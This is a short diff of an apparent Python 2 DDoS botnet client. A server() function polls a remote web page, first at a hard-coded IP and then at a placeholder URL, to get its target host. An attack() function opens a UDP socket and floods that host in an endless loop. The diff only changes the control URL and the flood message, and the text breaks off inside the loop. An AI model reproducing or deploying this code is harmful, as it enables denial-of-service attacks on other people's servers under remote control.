@@ -6,7 +6,7 @@ def server():
 	global clientnum
 	global host
 	while True:
-		gethost = urllib2.urlopen('http://77.97.151.61/testing/')
+		gethost = urllib2.urlopen('http://apache server/site/')
 		host = gethost.read()
 		clean = host.split("</br>")
 		clientnum = clean[1]
@@ -21,7 +21,7 @@ def server():
 def attack():
 	global host
 	port = 80
-	message="#I am the bestest in the world. "
+	message="#I am the best in the world. "
 	ip = socket.gethostbyname( host )
 	ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	while True:
